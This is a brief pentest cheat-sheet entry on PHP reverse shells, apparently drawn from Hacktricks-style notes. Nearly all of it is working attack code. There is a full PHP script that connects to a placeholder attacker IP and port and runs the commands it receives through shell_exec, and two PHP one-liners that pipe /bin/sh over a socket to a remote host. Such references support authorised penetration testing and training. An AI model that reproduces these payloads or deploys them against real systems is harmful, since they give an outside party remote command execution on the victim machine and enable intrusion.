# Reverse Shell

```php
<?php
$ip = '<attacker_IP>';
$port = <attacker_PORT>;

$sock = fsockopen($ip, $port);
if ($sock) {
    fputs($sock, "Connected to the reverse shell...\n");

    while (!feof($sock)) {
        $command = trim(fgets($sock));

        if ($command === 'exit') {
            break;
        }

        $output = shell_exec($command);
        fputs($sock, $output);
    }

    fputs($sock, "Closing reverse shell...\n");
    fclose($sock);
}
?>
```

One-liners.

```php
$ php -r '$sock=fsockopen("<IP>", <PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

$ php -r '$sock=fsockopen("<IP>", <PORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```


---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)